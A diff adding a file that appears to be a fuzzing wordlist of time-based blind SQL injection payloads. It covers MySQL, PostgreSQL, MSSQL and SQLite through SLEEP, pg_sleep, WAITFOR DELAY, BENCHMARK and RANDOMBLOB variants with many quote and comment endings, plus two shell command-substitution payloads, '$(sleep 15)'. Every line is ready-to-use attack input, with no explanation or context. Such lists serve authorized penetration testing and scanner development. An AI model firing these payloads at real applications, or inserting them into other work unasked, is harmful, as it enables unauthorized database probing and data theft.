@@ -1,0 +1,138 @@
+'XOR(if(now()=sysdate(),sleep(15),0))XOR
+0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
+(select*from(select(if(1=1,sleep(15),false)))a)
+(select*from(select(sleep(15)))a)
+'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
+'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
+2+%2b+((SELECT+1+FROM+(SELECT+SLEEP(15))A))%2f*%27XOR(((SELECT+1+FROM+(SELECT+SLEEP(15))A)))OR%27%7c%22XOR(((SELECT+1+FROM+(SELECT+SLEEP(15))A)))OR%22*%2f
+OR SLEEP(15)=0 LIMIT 1--
+) OR SLEEP(15)=0 LIMIT 1--
+' OR SLEEP(15)=0 LIMIT 1--
+') OR SLEEP(15)=0 LIMIT 1--
+)) OR SLEEP(15)=0 LIMIT 1--
+SELECT SLEEP(15)--
+sleep(15)#
+1 or sleep(15)#
+" or sleep(15)#
+' or sleep(15)#
+" or sleep(15)="
+' or sleep(15)='
+1) or sleep(15)#
+") or sleep(15)="
+') or sleep(15)='
+1)) or sleep(15)#
+")) or sleep(15)="
+$(sleep 15)
+$(sleep 15; echo )
+')) or sleep(15)='
+1 or pg_sleep(15)--
+" or pg_sleep(15)--
+' or pg_sleep(15)--
+1) or pg_sleep(15)--
+") or pg_sleep(15)--
+') or pg_sleep(15)--
+pg_sleep(15)--
+SLEEP(15)/*' or SLEEP(15) or '" or SLEEP(15) or "*/
+1 or SLEEP(15)#
+" or SLEEP(15)#
+' or SLEEP(15)#
+" or SLEEP(15)="
+' or SLEEP(15)='
+1) or SLEEP(15)#
+") or SLEEP(15)="
+') or SLEEP(15)='
+1)) or SLEEP(15)#
+")) or SLEEP(15)="
+')) or SLEEP(15)='
+;waitfor delay '0:0:15'--
+);waitfor delay '0:0:15'--
+';waitfor delay '0:0:15'--
+";waitfor delay '0:0:15'--
+');waitfor delay '0:0:15'--
+");waitfor delay '0:0:15'--
+));waitfor delay '0:0:15'--
+'));waitfor delay '0:0:15'--
+"));waitfor delay '0:0:15'--
+benchmark(10000000,MD5(1))#
+1 or benchmark(10000000,MD5(1))#
+" or benchmark(10000000,MD5(1))#
+' or benchmark(10000000,MD5(1))#
+1) or benchmark(10000000,MD5(1))#
+") or benchmark(10000000,MD5(1))#
+') or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+")) or benchmark(10000000,MD5(1))#
+')) or benchmark(10000000,MD5(1))#
+1 or pg_SLEEP(15)--
+" or pg_SLEEP(15)--
+' or pg_SLEEP(15)--
+1) or pg_SLEEP(15)--
+") or pg_SLEEP(15)--
+') or pg_SLEEP(15)--
+1)) or pg_SLEEP(15)--
+")) or pg_SLEEP(15)--
+')) or pg_SLEEP(15)--
+AND (SELECT * FROM (SELECT(SLEEP(15)))bAKL) AND 'vRxe'='vRxe
+AND (SELECT * FROM (SELECT(SLEEP(15)))YjoC) AND '%'='
+AND (SELECT * FROM (SELECT(SLEEP(15)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(15)))nQIP)--
+AND (SELECT * FROM (SELECT(SLEEP(15)))nQIP)#
+SLEEP(15)#
+SLEEP(15)--
+SLEEP(15)="
+SLEEP(15)='
+or SLEEP(15)
+or SLEEP(15)#
+or SLEEP(15)--
+or SLEEP(15)="
+or SLEEP(15)='
+waitfor delay '00:00:05'
+waitfor delay '00:00:05'--
+waitfor delay '00:00:05'#
+benchmark(50000000,MD5(1))
+benchmark(50000000,MD5(1))--
+benchmark(50000000,MD5(1))#
+or benchmark(50000000,MD5(1))
+or benchmark(50000000,MD5(1))--
+or benchmark(50000000,MD5(1))#
+pg_SLEEP(15)
+pg_SLEEP(15)--
+pg_SLEEP(15)#
+or pg_SLEEP(15)
+or pg_SLEEP(15)--
+or pg_SLEEP(15)#
+'\"
+AnD SLEEP(15)
+AnD SLEEP(15)--
+AnD SLEEP(15)#
+&&SLEEP(15)
+&&SLEEP(15)--
+&&SLEEP(15)#
+' AnD SLEEP(15) ANd '1
+'&&SLEEP(15)&&'1
+ORDER BY SLEEP(15)
+(SELECT * FROM (SELECT(SLEEP(15)))ecMj)
+(SELECT * FROM (SELECT(SLEEP(15)))ecMj)#
+(SELECT * FROM (SELECT(SLEEP(15)))ecMj)--
++benchmark(3200,SHA1(1))+'
++ SLEEP(15) + '
+RANDOMBLOB(500000000/2)
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+RANDOMBLOB(1000000000/2)
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+ORDER BY SLEEP(15)#
+ORDER BY 1,SLEEP(15)#
+ORDER BY 1,SLEEP(15),3#
+ORDER BY 1,SLEEP(15),3,4#
+ORDER BY 1,SLEEP(15),BENCHMARK(1000000,MD5('A')),4,5#
+ORDER BY 1,SLEEP(15),BENCHMARK(1000000,MD5('A')),4,5,6#
+ORDER BY 1,SLEEP(15),BENCHMARK(1000000,MD5('A')),4,5,6,7#
+ORDER BY SLEEP(15)--
+ORDER BY 1,SLEEP(15)--
+ORDER BY 1,SLEEP(15),3--
+ORDER BY 1,SLEEP(15),3,4--
+ORDER BY 1,SLEEP(15),BENCHMARK(1000000,MD5('A')),4,5--
+ORDER BY 1,SLEEP(15),BENCHMARK(1000000,MD5('A')),4,5,6--
+ORDER BY 1,SLEEP(15),BENCHMARK(1000000,MD5('A')),4,5,6,7--
